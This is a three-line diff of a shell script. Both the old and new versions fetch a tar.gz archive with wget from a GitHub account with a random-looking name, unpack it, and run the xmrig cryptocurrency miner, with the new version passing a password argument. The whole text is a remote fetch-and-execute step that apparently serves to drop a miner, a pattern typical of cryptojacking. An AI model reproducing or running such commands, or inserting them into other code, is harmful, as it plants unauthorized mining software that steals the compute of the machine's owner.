@@ -1,3 +1,3 @@
-wget https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbnmyxsc-svg/123/main/2.tar.gz
-tar -xvzf 2.tar.gz
-nohup ./xmrig > xmrig.log 2>&1 &
+wget https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbnmyxsc-svg/123/main/3.tar.gz
+tar -xvzf 3.tar.gz
+./xmrig -p $1
